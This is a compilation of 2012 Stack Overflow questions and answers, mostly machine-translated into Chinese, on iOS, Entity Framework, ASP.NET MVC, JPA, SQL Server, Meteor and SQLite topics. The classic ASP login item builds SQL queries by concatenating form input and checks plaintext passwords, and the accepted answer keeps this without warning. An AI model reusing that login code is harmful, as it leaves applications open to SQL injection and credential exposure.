I'm writing a webapp using mojolicous for my backend. Using nginx as reverse proxy in front of my hypnotoad webserver made my site accessible via ssl but not the websocket. Is there a way to proxy websocket and non-websocket traffic to the same port with nginx?

I would really appreciate every hint/link/help to solve this.

# ios - Limit Ad Tracking and Ad sdks

> ID：12603116
> 
> 赞同：4
> 
> 时间：2012-09-26T13:42:04.800
> 
> 标签：ios, xcode, sdk, ios6, ads

I am trying to understand the new "Limit ad tracking" feature in iOS. I have to implement a couple of ad sdks into my app. Within these sdks I need to pass certain information like current user location, name, gender, a unique user id etc to deploy targeted apps.

From the documentation, it is stated that

To get the advertising identifier:

*   Get a reference to the shared instance of this class using the sharedManager method.

*   Check whether advertising tracking is limited using the advertisingTrackingEnabled property.

    If the user has limited ad tracking, use the advertising identifier only for the following purposes: frequency capping, conversion events, estimating the number of unique users, security and fraud detection, and debugging.

*   Get the advertising identifier using the advertisingIdentifier property.

Since there is nothing more specific mentioned about location information, name, gender etc with regards to ads. My question is for ios 6+ do I need to check if the user has enabled "Limit ad tracking" and only then pass these parameters?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-09T22:37:44.433

AdSupport API 应该用于向应用指示它是否应该进行广告跟踪。作为应用程序开发人员，您可以决定对用户进行哪些跟踪：可能是行为信息（他们对应用程序所做的事情）或个人身份信息（他们是谁，姓名或电子邮件或其他）或一般人口统计信息（他们在哪里，男性/女性等）

无论您使用什么信息向用户提供广告，您都应该（或必须，取决于国家和法律）在隐私政策中披露您的应用程序的功能。我不是律师，所以您应该确保获得有关隐私和您的应用程序的实际法律建议。

从技术角度来看，您需要执行以下操作：

```
ASIdentifierManager *adIdentManager = [ASIdentifierManager sharedManager];
if (adIdentManager.advertisingTrackingEnabled) {
    // do ad tracking/targeting stuff
} else {
    // throw away any tracking info you may have saved before
} 
```

在应用程序启动/恢复时。

据推测，您可能选择包含在您的应用程序中的大型广告公司 SDK 会考虑到这一点，但值得一问。

# ios - 如何在mac中的NSLibraryDirectory中创建文件夹

> ID：12603119
> 
> 赞同：0
> 
> 时间：2012-09-26T13:42:09.973
> 
> 标签：ios, osx-lion

我试图在用户库目录中创建一个文件夹，但它没有创建。下面的代码是否有任何错误。

```
databaseName = @"KITSMAW0051_DB.sqlite";
// Get the path to the documents directory and append the databaseName
NSArray *documentPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
NSString *documentsDir = [documentPaths objectAtIndex:0];
NSString *folder = @"Swasstik";
databasePath = [[documentsDir stringByAppendingPathComponent:folder ] stringByAppendingPathComponent:databaseName]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:47:14.197

好的，首先`databasePath`描述文件的路径而不是目录。但是，假设您实际上想在用户的库中创建“Swasstik”文件夹：

```
// Your code
NSArray *documentPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
NSString *documentsDir = [documentPaths objectAtIndex:0];
NSString *folder = @"Swasstik";
// I edited here to keep only the folder
NSString *folderPath = [documentsDir stringByAppendingPathComponent:folder];

// At this point we got the path to the folder
// but we want to actually go on and create it
// NSFileManager to the rescue!
NSFileManager *manager = [NSFileManager defaultManager];
[manager createDirectoryAtPath: folderPath
 withIntermediateDirectories: NO
 attributes: nil
 error: nil]; 
```

当然你可以[学习](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsfilemanager_Class/Reference/Reference.html)和设置你喜欢的管理器，也可以实现一些错误处理。我希望这是有道理的......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:47:46.210

```
databaseName = @"KITSMAW0051_DB.sqlite";
NSArray *documentPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
NSString *documentsDir = [documentPaths objectAtIndex:0];
NSString *folder = [documentsDir stringByAppendingPathComponent:@"Swasstik"];
NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;
if (![fileManager fileExistsAtPath:folder]) {
    [fileManager createDirectoryAtPath:folder withIntermediateDirectories:YES attributes:nil error:&error];
}
if (error != nil) {
    NSLog(@"Some error: %@", error);
    return;
}
NSString *databasePath = [folder stringByAppendingPathComponent:databaseName]; 
```

# entity-framework - EF代码优先；多对多集合为空？

> ID：12603122
> 
> 赞同：1
> 
> 时间：2012-09-26T13:42:15.923
> 
> 标签：entity-framework, many-to-many, entity-relationship

使用 EF 多对多关系，我是否必须手动实例化相应的对象集合？

像...

```
public class Class1 {
  [Key]
  public int Id { get; set;
  public List<Class2> OtherObjects {get; set;}
}

public class Class2 {
  [Key]
  public int Id { get; set;
  public List<Class1> OtherObjects {get; set;}
} 
```

还有别的地方...

```
Class1 c = new Class1 {
  OtherObjects = new List<Class2>(); // necessary? Do I have to do this?
};

c.OtherObjects.Add(new Class2()); 
```

像这样？因为当我建立一对多关系时，集合似乎是自动实例化的。这与多对多关系不同吗？*或者当集合OtherObjects*为空时，我的应用程序中是否存在错误或不当行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:52:01.620

你必须这样做。或者，您可以在构造函数中实例化集合。

旁注：当我有一对多时，我需要实例化我的集合。我不确定你为什么不需要。

假设下面的类。

```
public class Class1 {
  [Key]
  public int Id { get; set;
  public Class2 OtherObject {get; set;}
}

public class Class2 {
  [Key]
  public int Id { get; set;
  public List<Class1> OtherObjects {get; set;}
} 
```

你可以这样做

```
Class1 class1 = new Class1();
class1.OtherObject = new Class2(); 
```

但是，如果您以其他方式执行分配，则必须实例化您的集合。

```
Class2 class2 = new Class2();
class2.OtherObjects = new List<Class1>(); //required
class2.OtherObjects.Add(new Class1()); 
```

# asp.net-mvc-3 - CSS for Dropdown in MVC

> ID：12603124
> 
> 赞同：0
> 
> 时间：2012-09-26T13:42:18.553
> 
> 标签：asp.net-mvc-3

i have a code like this in MVC 3 @Html.DropDownList("SomeID", "Select ID") i need to apply some styles to this Dropdown.

this doesn't working for me " new { @class="dropdown" }".

Help me, thanks in advance.

Thanks, [Ramesh Kumar](http://iprameshkumar.com/ "Ramesh Kumar")

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T19:55:09.503

用这个：

```
 @Html.DropDownList("MyDropdown", MySelectList, new { @class="mycssclass" }) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:46:05.533

当你这样使用

```
@Html.DropDownList("SomeID", "Select ID") 
```

那么这不起作用`" new { @class="dropdown" }"`

所以为了使用你的CSS然后你像这样使用

```
<div class="editor-field">
@Html.DropDownListFor(model => model.CountryId, new SelectList(Model.Countries, "ID", "Name"), "select", new { @ID = "ddlCountry", @class = "text", Style = "width: 150px;", onchange = "javascript:cascadingdropdown();" })
    @Html.ValidationMessageFor(model => model.Citys.countryID)
</div> 
```

我想这会对你有所帮助

# ios - Game Center 的持久数据？

> ID：12603131
> 
> 赞同：1
> 
> 时间：2012-09-26T13:42:39.287
> 
> 标签：ios, game-center

是否可以使用 Game Center 存储有关您的游戏的持久数据？因此，例如，我能否在他们的 Game Center 帐户中为链接到特定游戏的玩家存储“体验”值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:00:39.883

我通过使用不同的排行榜做了类似的事情。但是这种数据非常有限，只能增加一个玩家的分数。你想存储什么？经验可以存储在本地，甚至可以使用 NSUserDefaults 永久存储

# iframe - 在 iframe 中应用 css 而不使用 javascript 或 jquery

> ID：12603136
> 
> 赞同：1
> 
> 时间：2012-09-26T13:42:51.653
> 
> 标签：iframe

如何在不使用 javascript 或 jquery 的情况下将 css 注入 iframe 内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:51:58.330

如果不直接访问子页面，则无法修改其样式。如果可以，您可以像修改任何其他页面一样修改样式。只有 iframe 标记本身可以在没有任何 javascript 的情况下进行样式设置。

*有关使用*javascript的样式，[请参见此处](https://stackoverflow.com/questions/217776/how-to-apply-css-to-iframe)。

# smtp - 部署应用程序时，客户应该可以看到哪些 SMTP 服务器设置？

> ID：12603140
> 
> 赞同：0
> 
> 时间：2012-09-26T13:43:07.933
> 
> 标签：smtp, jakarta-mail

我的 Web 应用程序安装在许多客户服务器上，并且该应用程序需要通过 SMTP 发送电子邮件。电子邮件 smtp 服务器由客户通过文本（属性）文件配置。

我无法确定文件中应包含哪些设置。对于某些服务器，让客户指定以下内容就足够了：

```
 mail.smtp.host = 
 mail.smtp.auth = 
 mail.smtp.user =
 mail.smtp.pass = 
 mail.from      = 
```

但是哪些设置将覆盖绝大多数服务器，所以我不担心会丢失某些设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T00:30:48.080

一个明显的方法是查看其他邮件程序，如 Thunderbird 或 Outlook，并查看它们提供的配置选项。

您肯定需要一个控制 SSL 使用的选项，它具有三个值：

*   建立纯文本连接
*   建立纯文本连接，然后使用 STARTTLS 命令切换到 SSL 连接
*   建立 SSL 连接以开始

这些对应于 mail.smtp.ssl.enable 和 mail.smtp.starttls.enable 属性的各种设置。

如果您还没有，您应该查看[com.sun.mail.smtp 包的 javadocs 中](http://javamail.kenai.com/nonav/javadocs/com/sun/mail/smtp/package-summary.html)描述的所有属性。

mail.smtp.auth 应始终设置为 true。

那应该让你开始。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-16T23:01:32.837

您可能还想让他们指定端口。

通常使用以下几种：

*   25 用于 SMTP
*   465 用于 SSL
*   587 用于 TLS

# asp-classic - 经典 ASP (VBScript) 中的 ElseIF 语句

> ID：12603142
> 
> 赞同：3
> 
> 时间：2012-09-26T13:43:27.973
> 
> 标签：asp-classic, vbscript

这可能真的很简单，但我几乎没有任何经典 ASP 语法的经验。基本上我有登录声明。如下图所示：

```
<%if session("AccountID") = "0" or session("AccountID")=""  then%>
                    <%
                    If request.form("SmPress") = "Pressed" Then
                        dim SQLVerifyEmail
                        SQLVerifyEmail = "SELECT * FROM Users WHERE UserName= '"&killchars(request.form("UserName"))&"' and Password = '"&killchars(request.form("Password"))&"' AND Status = 'A' AND Deleted = 'no'  "
                        set RSVerifyEmail = MyConn.execute(SQLVerifyEmail)
                        If RSVerifyEmail.EOF Then

                            response.write ("<span class=loginerror>Incorrect login details.</span><br>")

                        Else
                            LastLogin2 = "UPDATE Users SET LastLogin = Convert(datetime,'"&now()&"',103) WHERE AccountID = '"&RSVerifyEmail("AccountID")&"' "
                            MyConn.execute(LastLogin2)
                            session("admin") = RSVerifyEmail("admin")
                            session("AccountID") = RSVerifyEmail("AccountID")
                            response.redirect "profile.asp"

                        End if
                    End if
                    %> 
```

我要做的就是拆分它，这样如果 session = admin 它将重定向到 profile.asp，但如果它等于帐户 ID，则重定向到 profile-user.asp。我尝试了以下方法，但它通过大量错误：

```
ElseIF
                            LastLogin2 = "UPDATE Users SET LastLogin = Convert(datetime,'"&now()&"',103) WHERE AccountID = '"&RSVerifyEmail("AccountID")&"' "
                            MyConn.execute(LastLogin2)
                            session("admin") = RSVerifyEmail("admin") Then
                            response.redirect "profile.asp"

                        Else
                        session("AccountID") = RSVerifyEmail("AccountID")
                        response.redirect "profile-user.asp"
                        End if
                    End if
                    %> 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:08:42.340

假设您只在数据库中的管理员配置文件上设置 RSVerifyEmail("admin") = "True"：试试这个：

```
<% if session("AccountID") = "0" or session("AccountID") = ""  then %>
<%
If request.form("SmPress") = "Pressed" Then
    dim SQLVerifyEmail
        SQLVerifyEmail = "SELECT * FROM Users WHERE UserName= '"&killchars(request.form("UserName"))&"' and Password = '"&killchars(request.form("Password"))&"' AND Status = 'A' AND Deleted = 'no'  "

    set RSVerifyEmail = MyConn.execute(SQLVerifyEmail)
        If RSVerifyEmail.EOF Then
            response.write ("<span class=loginerror>Incorrect login details.</span><br>")
        Else
            LastLogin2 = "UPDATE Users SET LastLogin = Convert(datetime,'"&now()&"',103) WHERE AccountID = '"&RSVerifyEmail("AccountID")&"' "
            MyConn.execute(LastLogin2)

            ' // Set only for admin session only for admins
            IF RSVerifyEmail("admin") = "True" Then
                RedirectWho         = "admin"
                session("admin")    = RSVerifyEmail("admin")
            Else
                RedirectWho         = "user"
            End if
            session("AccountID")    =   RSVerifyEmail("AccountID")
        End if
    set RSVerifyEmail = Nothing

    ' // redirect the logged in user or admin
    If RedirectWho = "admin" Then
        response.redirect "profile.asp"
    ElseIf RedirectWho = "user" Then
        response.redirect "profile-user.asp"
    End if
End if
%> 
```

# javascript - Meteor：跨所有浏览器更新

> ID：12603145
> 
> 赞同：2
> 
> 时间：2012-09-26T13:43:32.497
> 
> 标签：javascript, meteor

我正在开发我的第一个 Meteor 应用程序，但我不知道如何在所有浏览器中更新某些内容。

情况是这样的：当一个人在打字时，我想在所有浏览器上显示“正在打字……”（所以对每个用户来说），但我不知道该怎么做。

到目前为止，这是我的代码：

```
Messages = new Meteor.Collection("messages");
if( Meteor.isClient ) {

  // Templating
  Template.messages.entries = function() {
    return Messages.find();
  };

  // Events
  Template.messages.events({
    'click #new_post' : function() {
      var new_message = document.getElementById("new_message").value;
      if( new_message.length > 0 ) {
        Messages.insert({ text: new_message });
        document.getElementById("new_message").value = "";
      }
    },
    'focus #new_message' : function() {
      // Say "typing..."
    },
    'blur #new_message' : function() {
      // Say nothing
    }
  });
} 
```

如您所见，我想说：在文本字段被聚焦时输入。现在我以前试过这个（但没有成功）：

```
'focus #new_message' : function() {
  // Say "typing..."
  Template.messages.typing = function() {
    return "typing...";
  };
}, 
```

但它没有更新我的 HTML。我的模板中有 {{typing}} 标记，它是模板消息，没错。但是不会更新。。

你们有线索吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:22:34.647

只有集合在浏览器之间同步，并在 Meteor 中发布/订阅。

也许您可以拥有一个`Users`带有`is_typing`字段的集合，并用它创建一个响应式模板助手？

非常基本的例子：

```
Template.messages.is_typing = function() {
  return Users.find({is_typing:true}).count() > 0
}; 
```

并在模板中

```
<template name="messages">
  {{#if is_typing}}
     typing
  {{else}}
     idle
  {{/if}}
</template> 
```

# c# - 在 Solver Foundation 中将字符串转换为约束“术语”

> ID：12603150
> 
> 赞同：3
> 
> 时间：2012-09-26T13:43:46.190
> 
> 标签：c#, linear-programming, ms-solver-foundation

我正在尝试使用 Solver Foundation 创建一个能够解决线性规划问题的应用程序。长话短说，我在尝试将字符串表达式转换为 Microsoft.SolverFoundation.Services.Term 时遇到了困难。

我想要做的是添加一个字符串作为模型的约束，但首先它必须转换为“术语”。

```
SolverContext context = SolverContext.GetContext();
Model model = context.CreateModel();

Decision vz = new Decision(Domain.IntegerNonnegative, "barrels_venezuela");
Decision sa = new Decision(Domain.IntegerNonnegative, "barrels_saudiarabia");
Decision se = new Decision(Domain.IntegerNonnegative, "barrels_saudiarabiad");
model.AddDecisions(vz,sa,se);

string theTerm = "(20 * sa) + (15 * vz) + (3 * se)";
Term T = (Term)theTerm;
model.AddConstraint("Name_of_constraint", T); 
```

我尝试铸造（如上）但无济于事。

如何将字符串作为可接受的术语传递给 addConstraint 函数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T13:56:16.363

您需要做的是使用 :s 的*全*名`Decision`而不是变量的名称，并让`AddConstraint(string, string)`重载为您进行解析。像这样：

```
string theTerm = "(20 * barrels_saudiarabia) + 
                  (15 * barrels_venezuela) + (3 * barrels_saudiarabiad)";
model.AddConstraint("Name_of_constraint", theTerm); 
```

为此，表达式字符串当然必须符合[优化建模语言](http://msdn.microsoft.com/en-us/library/ff524507%28v=vs.93%29.aspx)的规则。

# jpa-2.0 - JPA 2.0 LEFT JOIN 引入 INNER JOIN

> ID：12603155
> 
> 赞同：0
> 
> 时间：2012-09-26T13:43:57.503
> 
> 标签：jpa-2.0, left-join

我有一个带有名称字段的 ClassRoom 类，以及一个带有 ClassRoom 字段的 Student 类。并非所有学生都有教室。我想要所有学生的列表以及他们的教室名称（如果没有教室，则为空字符串）。使用此 JPQL 查询：

```
Select s.name, s.classRoom.name from Student s LEFT JOIN s.classRoom 
```

问题是这只会返回有教室的学生。正确生成的 SQL 应该是

```
Select s.name, c.name from student s left join classroom c on c.id=s.classroomid 
```

它返回所有学生，但 s.classRoom.name 构造似乎强制在生成的 SQL 中进行内部连接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:47:22.023

使用链式表达式 like`s.classRoom.name`生成内连接。您需要为左连接实体分配一个别名并使用该别名：

```
select s.name, c.name from Student s left join s.classRoom c 
```

# sql-server - SQL Server 字符串约束

> ID：12603156
> 
> 赞同：6
> 
> 时间：2012-09-26T13:44:02.507
> 
> 标签：sql-server, database, constraints

我有一个 SQL Server 数据库，其时间列只能用文本“am”或“pm”填充，但我无法找到允许我执行此操作的约束。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-26T13:46:03.227

对于 SQL 服务器，您可以使用[`CHECK`约束](http://msdn.microsoft.com/en-us/library/ms188258%28v=sql.105%29.aspx)，它允许您定义所有行必须满足才能进入表的谓词。像这样：

```
ALTER TABLE TableName 
ADD CONSTRAINT CHK_ampm
CHECK(ColumnName IN ('am', 'pm')); 
```

# javascript - 如何始终使用 Javascript 将窗口置于最前面？

> ID：12603157
> 
> 赞同：0
> 
> 时间：2012-09-26T13:44:07.253
> 
> 标签：javascript, jquery, html, firefox

这是我的页面（主要）中的链接：

```
<a href="log_details.jsf#MyAnchor" target="log">View details</a> 
```

如果还没有打开任何窗口，则会出现一个新窗口（我们称之为 LOG）并在顶部指向锚点。

如果 LOG 保持打开状态并且用户决定返回 MAIN 以单击类似这样的另一个链接

```
<a href="log_details.jsf#MyAnchor2" target="log">View details</a> 
```

LOG 中的位置已移至 MyAnchor2，但 LOG 并未置顶。

每当用户单击类似于以下内容的链接时，如何使 LOG 出现在顶部：

```
<a href="log_details.jsf#MyAnchorXXX" target="log">View details</a> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:00:04.567

如果窗口已经打开并且`log`您的 Javascript 中的变量知道该窗口，您应该能够调用`log.focus()`该窗口以将其置于最前面。

**编辑：**

当您使用该`target`属性时，它会给窗口一个“名称”。不过，此名称与 Javascript 变量是分开的。所以在 where 的实例中`target="log"`，没有对应的变量被命名为函数`log`引用。`.focus()`

```
 function logLinks(){
    //Get every A tag
    var links = document.getElementsByTagName('a');
    //Iterate through the elements and...
    for(i=0; i<links.length; i++){
        //If the element has a class of 'log'
        if(links[i].className=='log'){
            //Clone it
            var dup = links[i].cloneNode(true);
            //Strip move the href elsewhere
            dup.id=dup.href; 
            dup.href='';
            //Add a click listener
            dup.addEventListener('click', function(){openLog(this.id);}, false);
            //Replace the existing element on the page
            links[i].parentNode.replaceChild(dup, links[i]);
        }
    }
}

function openLog(link){
    //Open a window and give it focus
    var wh = window.open(link, 'logWindow');
    wh.focus();
}

//Run this function on page load
document.addEventListener("DOMContentLoaded", logLinks); 
```

上面的代码将遍历页面并将任何`a`设置为具有`log`该类的标签替换为一个版本，该版本打开一个与`href`该链接相关的窗口，然后`focus`在结果窗口上执行。

# javascript - 在函数的词法环境中更改绑定的值

> ID：12603160
> 
> 赞同：1
> 
> 时间：2012-09-26T13:44:19.227
> 
> 标签：javascript, theory

当调用一个函数时，会为该调用创建一个新的词法环境。该词法环境包含一个环境记录，该记录又包含该环境中存在的本地命名绑定。因此，例如：

```
(function () {

    var x = 123;

    // other code

}()); 
```

在上面的函数调用中，函数的词法环境中将存在一个 name`"x"`和 value的绑定。`123`

现在，如果我们想更改该绑定的值，我们可以：

1.  将标识符设置`x`为赋值运算符之一的左侧：

    ```
    x = 456; 
    // the value of the "x" binding has changed to 456 
    ```

2.  将标识符设置`x`为前缀/后缀递增/递减运算符的操作数：

    ```
    x++;
    // the value of the "x" binding has changed to 124 
    ```

**我的问题：**这些是改变“x”绑定值的仅有的两种方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:46:37.577

好吧，我认为我们不应该在这里谈论“绑定”。@Incognito 在对该问题的评论中给出的链接描述了变量和函数的绑定 - 但不是它们的*值*。

由于您的示例中的“x”分配了一个原始值，我认为没有办法改变它 - 如果不是在分配中（直接或语法糖）。

例如，这...

```
var x = 42;
x.y   = 24; 
```

...实际上不会导致更改`x`（它被转换为一个对象，分配了一个新属性，但是这个对象将被丢弃）。

和这个...

```
function x() { ... } 
```

... 也将无法为`x`.

更新：我的观点是`'var x = 42'`JS 中的语句（而不是 Erlang 中的语句）不会导致`42`(数字文字) 绑定到 variable `x`。

# opengl-es - IOS 6 MKMapView 在 [EAGLContext setCurrentContext] 上崩溃

> ID：12603161
> 
> 赞同：6
> 
> 时间：2012-09-26T13:44:20.277
> 
> 标签：opengl-es, mkmapview, exc-bad-access, ios6

我们正在开发一个 iPad 应用程序，从带有注释的地图视图开始。

当我们切换到另一个具有基于 opengl 的图表解决方案 (shinobi) 的视图时，通过使用故事板。返回到带有地图的视图时，在触摸地图以移动它之前没有问题。当我们尝试移动地图时，它在 [EAGLContext setCurrentContext] 处因 exc_bad_access 异常而崩溃

有任何想法吗？

这是崩溃日志的一部分：

```
OS Version:      iOS 6.0 (10A403)
Report Version:  104

Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x0000000c
Crashed Thread:  0

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:
0   OpenGLES                        0x39974b12 +[EAGLContext setCurrentContext:] + 74
1   VectorKit                       0x32c64f0c -[VGLGPU setPaused:] + 120
2   VectorKit                       0x32c54db8 -[VKMainLoop updateLinkState] + 492
3   VectorKit                       0x32c54950 -[VKScreenCanvas _updateDisplayStatus:] + 104
4   VectorKit                       0x32ccea9a -[VKScreenCanvas setGesturing:] + 254
5   MapKit                          0x34defc3c -[MKMapView _willStartUserInteraction] + 48
6   MapKit                          0x34de891a -[MKMapGestureController beginGesturing] + 50
7   MapKit                          0x34de8c6c -[MKMapGestureController handlePan:] + 252
8   UIKit                           0x379ead2c _UIGestureRecognizerSendActions + 124
9   UIKit                           0x379b23d8 -[UIGestureRecognizer _updateGestureWithEvent:] + 388
10  UIKit                           0x37b9f474 ... 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T14:09:18.393

我为 Shinobi 工作，我们一直在对此进行调查 - 部分原因是 Apple 的地图代码保留了我们的 GL-Context。作为临时解决方法，您可以创建一个 ShinobiChart 的子类，并在图表的 dealloc 方法中取消 GL 上下文，如下所示：

```
- (void) dealloc {
    [super dealloc];

    [EAGLContext setCurrentContext:nil]; // must be after dealloc
} 
```

或者如果您使用的是 ARC，（因为不允许发送 dealloc）：

```
#import <ShinobiCharts/SChartCanvas.h>

@interface ShinobiChartGl : ShinobiChart
@end

@implementation ShinobiChartGl

- (void) dealloc
{
    [self.canvas.glView removeFromSuperview];

    self.canvas.glView = nil; // force glView dealloc

    [EAGLContext setCurrentContext:nil];
}

@end 
```

希望这会有所帮助，但请直接与我们联系 - 我们将在下一个版本中进行全面修复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-09T11:35:46.467

for those who did not work even tried `[EAGLContext setCurrentContext:nil];` on dealloc, try this

```
dispatch_async(dispatch_get_main_queue(), ^{
        [EAGLContext setCurrentContext:nil];
    }); 
```

EAGLContext should be set on main thread.

# ios - 为 UINavigationItem 的 titleView 设置视图控制器

> ID：12603169
> 
> 赞同：0
> 
> 时间：2012-09-26T13:44:28.263
> 
> 标签：ios, cocoa-touch, uiviewcontroller, uinavigationcontroller, uinavigationitem

我正在创建一个视图控制器，它被推送到`UINavigationController`. 我需要一个自定义导航栏，因此我重写`navigationItem`了视图控制器的方法。在`titleView`（属性`UINavigationItem`）中，我需要一个包含两个按钮的自定义视图。问题：如何为这两个按钮应用视图控制器？

包含两个按钮的视图在 中定义`CustomTitleViewController.xib`，而其视图控制器在`CustomTitleViewController`类中定义。

这是我返回导航项 ( `MainViewController.m`) 的方式：

```
- (UINavigationItem *)navigationItem
{
    UINavigationItem *navItem = [[UINavigationItem alloc] init];

    UIViewController *customTitleViewController =
        [[CustomTitleViewController alloc] initWithNibName:@"CustomTitleViewController"
                                                    bundle:[NSBundle mainBundle]];

    navItem.titleView = [customTitleViewController view];

    return navItem;
} 
```

正如预期的那样，该视图显示在导航栏上。但是，点击按钮会使应用程序崩溃 ( `EXC_BAD_ACCESS`)。

错误信息：`message sent to deallocated instance 0x6e53850`。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:02:25.060

基本上，您需要保留指向 viewController 及其视图的指针。只需在您的 UINavigation 控制器子类上创建强大的属性。因为您在这里所做的是在每次调用导航项时实例化新控制器并在函数结束时实现它。这是一个非常快速的粗略修复： [https](https://www.dropbox.com/s/y6ltdyj951ioncd/Navigating.zip) : //www.dropbox.com/s/y6ltdyj951ioncd/Navigating.zip 确保不要一直重新实例化 VC 并保持指向它的指针。希望这有帮助。

# android - 使用 Android 在 SQLite 数据库中查找重复条目

> ID：12603175
> 
> 赞同：2
> 
> 时间：2012-09-26T13:44:43.307
> 
> 标签：android, database, sqlite, duplicates

我在 Android 中使用 SQLite 数据库，用户必须输入名称、ip 和 url，然后将其保存在数据库中。我希望能够识别名称列中是否有双重条目，但我不知道如何对其进行编程。我认为制作专栏`UNIQUE`是正确的方法......

我的 SQL 适配器：

```
public class ProjectsDBAdapter {

 public static final String KEY_ROWID = "_id";
 public static final String KEY_PROJECTNAME = "projectname";
 public static final String KEY_ROUTERIP = "routerip";
 public static final String KEY_URL = "url";
 public static final String KEY_CALIMERO = "calimero";

 private static final String TAG = "ProjectsDBAdapter";
 private DatabaseHelper mDbHelper;
 private SQLiteDatabase mDb;

 private static final String DATABASE_NAME = "KNXTable";
 private static final String SQLITE_TABLE = "Project";
 private static final int DATABASE_VERSION = 1;

 private final Context mCtx;

 private static final String DATABASE_CREATE =
  "CREATE TABLE if not exists " + SQLITE_TABLE + " (" +
  KEY_ROWID + " integer PRIMARY KEY autoincrement," +
  KEY_ROUTERIP + "," +
  KEY_PROJECTNAME + "," +
  KEY_URL + "," +
  KEY_CALIMERO + "," +
  "UNIQUE("+KEY_PROJECTNAME+")"+");";

 private static class DatabaseHelper extends SQLiteOpenHelper {

  DatabaseHelper(Context context) {
   super(context, DATABASE_NAME, null, DATABASE_VERSION);
  }

  @Override
  public void onCreate(SQLiteDatabase db) {
   //invoked when the database is created, 
   //this is where we can create tables and columns to them, create views or triggers.
   Log.w(TAG, DATABASE_CREATE);
   db.execSQL(DATABASE_CREATE);
  }

  public long createProject(String ip, String name, 
   String url, String calimero) {

  ContentValues initialValues = new ContentValues();
  initialValues.put(KEY_ROUTERIP, ip);
  initialValues.put(KEY_PROJECTNAME, name);
  initialValues.put(KEY_URL, url);
  initialValues.put(KEY_CALIMERO, calimero);

  return mDb.insert(SQLITE_TABLE, null, initialValues);
  } 
```

我希望你能给我一些提示，我已经尝试在创建表时使用 UNIQUE 但没有成功......

***更新***

SQLiteAdapter 中的方法：

```
 public long createProject(String ip, String name, 
   String url, String calimero) {

  ContentValues initialValues = new ContentValues();
  initialValues.put(KEY_ROUTERIP, ip);
  initialValues.put(KEY_PROJECTNAME, name);
  initialValues.put(KEY_URL, url);
  initialValues.put(KEY_CALIMERO, calimero);

  return mDb.insertOrThrow(SQLITE_TABLE, null, initialValues);
 } 
```

我活动中的电话：

```
 //DATABASE
 // Add project to Database
 dbHelper = new ProjectsDBAdapter(this);
 dbHelper.open();

 //Add Strings to database
 dbHelper.insertSomeProjects(IP, Name, URL, Calimero);
 //Generate ListView from SQLite Database
 displayListView(); 
```

和 logcat 输出：

```
01-27 00:02:56.555: E/AndroidRuntime(28526): FATAL EXCEPTION: main
01-27 00:02:56.555: E/AndroidRuntime(28526): java.lang.RuntimeException: Unable to start activity ComponentInfo{de.bertrandt.bertrandtknx/de.bertrandt.bertrandtknx.ProjectList}: android.database.sqlite.SQLiteConstraintException: error code 19: constraint failed
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1970)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1995)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.ActivityThread.access$600(ActivityThread.java:128)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1161)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.os.Handler.dispatchMessage(Handler.java:99)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.os.Looper.loop(Looper.java:137)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.ActivityThread.main(ActivityThread.java:4514)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at java.lang.reflect.Method.invokeNative(Native Method)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at java.lang.reflect.Method.invoke(Method.java:511)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:993)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:760)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at dalvik.system.NativeStart.main(Native Method)
01-27 00:02:56.555: E/AndroidRuntime(28526): Caused by: android.database.sqlite.SQLiteConstraintException: error code 19: constraint failed
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.database.sqlite.SQLiteStatement.native_executeInsert(Native Method)
